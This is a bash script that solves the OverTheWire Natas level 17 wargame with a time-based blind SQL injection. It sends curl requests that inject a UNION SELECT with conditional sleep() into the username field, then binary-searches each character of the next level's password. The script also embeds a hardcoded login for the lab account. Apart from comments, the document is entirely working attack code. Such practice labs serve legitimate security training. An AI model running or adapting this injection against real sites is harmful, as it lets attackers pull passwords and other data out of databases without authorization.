#!/bin/bash

needle() { # $1: string to insert as username for injection
	curl -Gs -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org/ --data-urlencode "username=$1" --data-urlencode "debug=true"
} # html returned from curl

gettime() { # 	$1: string to insert as username for injection 
	(time needle "$1") 2>&1 >curlout | awk 'NR == 2 {print $2}' | sed "s/.*m\(.*\)s/\1/"
} # execution time in sec (ex. 0.47)

testcond() { # $1: sql boolean expression, $2: timeout
	local timeout="1.5"
	if [ "$2" != "" ] ; then timeout="$2" ; fi 
	expr $(gettime "manning\" union select * from users where username=\"natas18\" and if($1, sleep($timeout), 1)=\"true") \> "$timeout"
} # 0 for false, 1 for true

injlt() { # $1: 1-based index of password, $2: character to compare to
	# $3: timeout
	testcond "substring(password,$1,1)<\"$2\"" "$3"
} # password[$1] < $2 ? 1 : 0

bincompare() { # $1: 1-based index of password, $2: character to compare to
	# $3: timeout
	testcond "binary substring(password,$1,1) = binary \"$2\"" "$3"
} # password[$1] = $2 ? 1 : 0

findchr() { # $1: 1-based index of password to find, $2: timeout
	local str="0123456789abcdefghijklmnopqrstuvwxyz"
	local a=0
	local b=35
	local n=0
	local chr="a"
	while (( a < b ))
	do	
		(( n = (a+b)/2+1 ))
		chr=${str:$n:1}
		if [ "$(injlt $1 $chr $3)" = "1" ]
		then
			(( b = (n-1) ))
		else
			(( a = n ))
		fi
	done
	chr=${str:$a:1}
	if (( a > 9 ))
	then # check letter case
		if [ "$(bincompare $1 $chr $3)" = "0" ]
		then # convert to uppercase
			chr=$(echo "$chr" | tr a-z A-Z)
		fi
	fi
	echo $chr
} # natas18's password at $1


findall() {
	for i in {1..32}
	do
		local chr="$(findchr $i)"
		local timeout=2
		while [ "$(bincompare $i $chr $timeout)" = "0" ]
		do
			(( timeout += 1 ))
			chr="$(findchr $i $timeout)"
		done
		echo -n "$chr"
	done
	echo
}

